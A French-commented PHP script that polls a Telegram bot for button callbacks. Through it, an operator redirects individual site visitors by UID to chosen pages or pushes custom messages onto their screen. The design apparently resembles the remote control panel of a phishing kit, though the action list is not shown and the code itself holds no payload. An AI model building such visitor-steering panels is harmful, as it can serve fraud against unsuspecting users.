<?php
// Système de callback Telegram simplifié et fiable

if (!defined('ALLOW_INCLUDE')) {
    define('ALLOW_INCLUDE', true);
}

session_start();
require_once '../modules/load_config.php';

$bot_token = getConfig('BOT_TOKEN', null);
$chat_id_global = getConfig('CHAT_ID', null);

// Optimisations pour XAMPP
ini_set('max_execution_time', 5);
ini_set('memory_limit', '64M');
ini_set('default_socket_timeout', 3);

header('Content-Type: text/plain; charset=utf-8');

// --- Logging simple ---
$logFile = __DIR__ . '/callback_debug.log';
function logMsg($msg) {
    global $logFile;
    file_put_contents($logFile, date('Y-m-d H:i:s') . " - " . $msg . PHP_EOL, FILE_APPEND);
}


// Charger la configuration centralisée des actions
require_once __DIR__ . '/action_config.php';

// --- Fonction pour répondre au message sans supprimer le clavier ---
function replyToMessage($bot_token, $chat_id, $message_id, $action, $actionConfig = []) {
    // Récupérer le nom de l'action depuis la config centralisée
    $buttonName = getActionName($action, $actionConfig);
    
    // Répondre au message avec la redirection (sans supprimer le clavier)
    $replyUrl = "https://api.telegram.org/bot$bot_token/sendMessage";
    $reply_fields = [
        'chat_id' => $chat_id,
        'text' => "✅ User redirigé sur $buttonName",
        'reply_to_message_id' => $message_id
    ];
    
    $ch = curl_init($replyUrl);
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $reply_fields,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 5
    ]);
    
    $result = curl_exec($ch);
    curl_close($ch);
    
    return $result;
}


function removeKeyboardAndReply($bot_token, $chat_id, $message_id, $action, $actionConfig = []) {
    // Récupérer le nom de l'action depuis la config centralisée
    $buttonName = getActionName($action, $actionConfig);
    
    // 1. Supprimer le clavier du message original
    $editUrl = "https://api.telegram.org/bot$bot_token/editMessageReplyMarkup";
    $post_fields = [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'reply_markup' => json_encode(['inline_keyboard' => []])
    ];
    
    $ch = curl_init($editUrl);
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $post_fields,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 5
    ]);
    curl_exec($ch);
    curl_close($ch);
    
    // 2. Répondre au message avec la redirection
    $replyUrl = "https://api.telegram.org/bot$bot_token/sendMessage";
    $reply_fields = [
        'chat_id' => $chat_id,
        'text' => "User redirigé sur $buttonName",
        'reply_to_message_id' => $message_id
    ];
    
    $ch = curl_init($replyUrl);
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $reply_fields,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 5
    ]);
    
    $result = curl_exec($ch);
    curl_close($ch);
    
    return $result;
}

// --- Vérification token ---
if (!$bot_token) {
    logMsg("Token manquant");
    echo "none";
    exit;
}

// --- Récupération des updates ---
function getUpdates($bot_token, $offset = 0) {
    $url = "https://api.telegram.org/bot$bot_token/getUpdates?offset=" . intval($offset);
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10
    ]);
    $result = curl_exec($ch);
    $error = curl_error($ch);
    curl_close($ch);

    if ($error) {
        logMsg("cURL Error getUpdates: $error");
        return [];
    }

    $response = json_decode($result, true);
    if (!$response || !($response['ok'] ?? false)) {
        $desc = $response['description'] ?? 'Unknown error';
        logMsg("Telegram API Error getUpdates: $desc");
        return [];
    }

    return $response['result'] ?? [];
}

// Helper — marque un update_id comme traité (double protection contre les re-traitements)
function markUpdateProcessed($updateId, $processedFile, &$processedIds, $lastUpdateIdFile) {
    $processedIds[] = $updateId;
    @file_put_contents($processedFile, json_encode(array_slice($processedIds, -200)), LOCK_EX);
    @file_put_contents($lastUpdateIdFile, $updateId, LOCK_EX);
}

try {
    $lastUpdateIdFile = __DIR__ . '/last_update_id.txt';
    if (!file_exists($lastUpdateIdFile)) file_put_contents($lastUpdateIdFile, '0');
    $lastUpdateId = (int)file_get_contents($lastUpdateIdFile);

    // Fichier de déduplication — évite de re-traiter un update_id même si last_update_id.txt échoue
    $processedFile = __DIR__ . '/processed_updates.json';
    $processedIds = [];
    if (file_exists($processedFile)) {
        $raw = json_decode(file_get_contents($processedFile), true);
        if (is_array($raw)) {
            // Garder seulement les 200 derniers IDs pour éviter la croissance infinie
            $processedIds = array_slice($raw, -200, 200, false);
        }
    }

    $updates = getUpdates($bot_token, $lastUpdateId + 1);

    if (empty($updates)) {
        echo "none";
        exit;
    }

    foreach ($updates as $update) {
        $updateId = $update['update_id'] ?? 0;

        // Déduplication — ignorer si déjà traité
        if (in_array($updateId, $processedIds, true)) {
            logMsg("Update $updateId déjà traité, ignoré");
            continue;
        }

        // --- Gestion des messages texte ---
        if (isset($update['message']) && isset($update['message']['text'])) {
            $message = $update['message']['text'];
            $chat_id = $update['message']['chat']['id'];
            $message_id = $update['message']['message_id'];
            
            // Vérifier si on attend un message personnalisé pour ce chat
            $waitingFile = __DIR__ . '/waiting_custom_message.json';
            if (file_exists($waitingFile)) {
                $waiting = json_decode(file_get_contents($waitingFile), true) ?: [];
                
                if (isset($waiting[$chat_id])) {
                    $waitingData = $waiting[$chat_id];
                    $uid = $waitingData['uid'];
                    
                    // Vérifier si la demande n'est pas trop ancienne (5 minutes)
                    if (time() - $waitingData['timestamp'] < 300) {
                        // Sauvegarder le message personnalisé
                        $customMessageFile = __DIR__ . '/custom_messages.json';
                        $customMessages = [];
                        if (file_exists($customMessageFile)) {
                            $customMessages = json_decode(file_get_contents($customMessageFile), true) ?: [];
                        }
                        
                        $customMessages[] = [
                            'message' => $message,
                            'timestamp' => time(),
                            'datetime' => date('Y-m-d H:i:s'),
                            'chat_id' => $chat_id,
                            'uid' => $uid
                        ];
                        
                        file_put_contents($customMessageFile, json_encode($customMessages, JSON_PRETTY_PRINT));
                        
                        // Nettoyer les anciens messages si le fichier devient trop volumineux
                        if (count($customMessages) > 100) {
                            $cutoffTime = time() - (24 * 60 * 60); // 24 heures
                            $customMessages = array_filter($customMessages, function($msg) use ($cutoffTime) {
                                return isset($msg['timestamp']) && $msg['timestamp'] > $cutoffTime;
                            });
                            $customMessages = array_values($customMessages);
                            file_put_contents($customMessageFile, json_encode($customMessages, JSON_PRETTY_PRINT));
                        }
                        
                        // Invalider le cache pour cet UID spécifique
                        require_once __DIR__ . '/cache_manager.php';
                        CacheManager::clear('custom_message_latest_' . $uid);
                        
                        // Sauvegarder l'UID actuel pour la synchronisation
                        file_put_contents(__DIR__ . '/current_uid.txt', $uid);
                        
                        // Supprimer de la liste d'attente
                        unset($waiting[$chat_id]);
                        file_put_contents($waitingFile, json_encode($waiting, JSON_PRETTY_PRINT));
                        
                        // Répondre à l'utilisateur
                        $replyUrl = "https://api.telegram.org/bot$bot_token/sendMessage";
                        $reply_fields = [
                            'chat_id' => $chat_id,
                            'text' => "✅ Message personnalisé enregistré : \"$message\"\n\n🔄 Redirection vers la page d'affichage...",
                            'reply_to_message_id' => $message_id
                        ];
                        
                        $ch = curl_init($replyUrl);
                        curl_setopt_array($ch, [
                            CURLOPT_POST => true,
                            CURLOPT_POSTFIELDS => $reply_fields,
                            CURLOPT_RETURNTRANSFER => true,
                            CURLOPT_TIMEOUT => 2, // Timeout très réduit pour XAMPP
            CURLOPT_CONNECTTIMEOUT => 1
                        ]);
                        curl_exec($ch);
                        curl_close($ch);
                        
                        // Maintenant rediriger vers custom_input.php
                        echo "custom_message";
                        markUpdateProcessed($updateId, $processedFile, $processedIds, $lastUpdateIdFile);
                        logMsg("Message personnalisé reçu et redirection: $message pour UID: $uid");
                        exit;
                    } else {
                        // Supprimer l'entrée expirée
                        unset($waiting[$chat_id]);
                        file_put_contents($waitingFile, json_encode($waiting, JSON_PRETTY_PRINT));
                    }
                }
            }
        }

        // --- Gestion callback_query ---
        if (isset($update['callback_query'])) {
            $callbackData = $update['callback_query']['data'] ?? '';
            $callbackQueryId = $update['callback_query']['id'] ?? '';

            // --- Validation format ---
            if (!strpos($callbackData,'|')) {
                logMsg("Format callback_data invalide : $callbackData");
                markUpdateProcessed($updateId, $processedFile, $processedIds, $lastUpdateIdFile);
                continue;
            }

            list($action, $uid) = explode('|', $callbackData, 2);

            // Utiliser la configuration centralisée
            $actionConfig = $allActions;
            
            $allowedActions = array_keys($actionConfig);

            if (!in_array($action, $allowedActions, true)) {
                logMsg("Action non autorisée: $action");
                markUpdateProcessed($updateId, $processedFile, $processedIds, $lastUpdateIdFile);
                continue;
            }

            // Réponse immédiate à Telegram avec message temporaire
            $answerUrl = "https://api.telegram.org/bot$bot_token/answerCallbackQuery";
            $post_fields = [
                'callback_query_id' => $callbackQueryId,
                'text' => '✅ Action prise en compte !',
                'show_alert' => false
            ];
            $ch = curl_init($answerUrl);
            curl_setopt_array($ch, [
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => $post_fields,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => 2, // Timeout très réduit pour XAMPP
            CURLOPT_CONNECTTIMEOUT => 1
            ]);
            curl_exec($ch);
            curl_close($ch);

            // Gestion spéciale pour custom_input
            if ($action === 'custom_input') {
                // Demander le message personnalisé avant de rediriger
                $message_id = $update['callback_query']['message']['message_id'];
                $chat_id = $update['callback_query']['message']['chat']['id'];
                
                $replyUrl = "https://api.telegram.org/bot$bot_token/sendMessage";
                $reply_fields = [
                    'chat_id' => $chat_id,
                    'text' => "📝 **Message personnalisé demandé**\n\nVeuillez écrire le message que vous souhaitez afficher sur la page :",
                    'reply_to_message_id' => $message_id,
                    'parse_mode' => 'Markdown'
                ];
                
                $ch = curl_init($replyUrl);
                curl_setopt_array($ch, [
                    CURLOPT_POST => true,
                    CURLOPT_POSTFIELDS => $reply_fields,
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_TIMEOUT => 2, // Timeout très réduit pour XAMPP
            CURLOPT_CONNECTTIMEOUT => 1
                ]);
                curl_exec($ch);
                curl_close($ch);
                
                // Marquer que nous attendons un message personnalisé pour ce chat
                $waitingFile = __DIR__ . '/waiting_custom_message.json';
                $waiting = [];
                if (file_exists($waitingFile)) {
                    $waiting = json_decode(file_get_contents($waitingFile), true) ?: [];
                }
                
                $waiting[$chat_id] = [
                    'timestamp' => time(),
                    'uid' => $uid
                ];
                
                file_put_contents($waitingFile, json_encode($waiting, JSON_PRETTY_PRINT));
                
                // NE PAS rediriger, juste confirmer
                echo "custom_input_waiting";
                markUpdateProcessed($updateId, $processedFile, $processedIds, $lastUpdateIdFile);
                logMsg("Demande de message personnalisé pour UID: $uid - EN ATTENTE");
                exit;
            } else {
                // Cooldown anti-spam : ne pas renvoyer le même message Telegram si déjà envoyé
                // pour ce UID + action dans les 30 dernières secondes
                $actionLogFile = __DIR__ . '/action_log.json';
                $existingActions = [];
                if (file_exists($actionLogFile)) {
                    $existingActions = json_decode(file_get_contents($actionLogFile), true) ?: [];
                }

                $cooldownSecs = 30;
                $alreadySent = false;
                foreach ($existingActions as $entry) {
                    if (
                        isset($entry['action'], $entry['uid'], $entry['timestamp']) &&
                        $entry['action'] === $action &&
                        $entry['uid']    === $uid &&
                        (time() - $entry['timestamp']) < $cooldownSecs
                    ) {
                        $alreadySent = true;
                        break;
                    }
                }

                if (!$alreadySent && isset($update['callback_query']['message']['message_id'])) {
                    $message_id = $update['callback_query']['message']['message_id'];
                    $chat_id    = $update['callback_query']['message']['chat']['id'];
                    replyToMessage($bot_token, $chat_id, $message_id, $action, $actionConfig);

                    // Enregistrer l'envoi pour le cooldown
                    $existingActions = array_filter($existingActions, fn($e) =>
                        isset($e['timestamp']) && (time() - $e['timestamp']) < 300
                    );
                    $existingActions[] = [
                        'action'   => $action,
                        'uid'      => $uid,
                        'timestamp'=> time(),
                        'datetime' => date('Y-m-d H:i:s'),
                        'chat_id'  => $update['callback_query']['message']['chat']['id'] ?? null,
                    ];
                    @file_put_contents($actionLogFile, json_encode(array_values($existingActions), JSON_PRETTY_PRINT), LOCK_EX);
                } else if ($alreadySent) {
                    logMsg("Cooldown actif — message Telegram non renvoyé pour $action / UID $uid");
                }
            }

            usleep(100000); // 0.1 seconde
            
            echo $action;
            markUpdateProcessed($updateId, $processedFile, $processedIds, $lastUpdateIdFile);
            logMsg("Action traitée: $action pour UID: $uid à " . date('Y-m-d H:i:s'));
            exit;
        }

        markUpdateProcessed($updateId, $processedFile, $processedIds, $lastUpdateIdFile);
    }

    echo "none";

} catch (Exception $e) {
    logMsg("Exception: ".$e->getMessage());
    echo "none";
}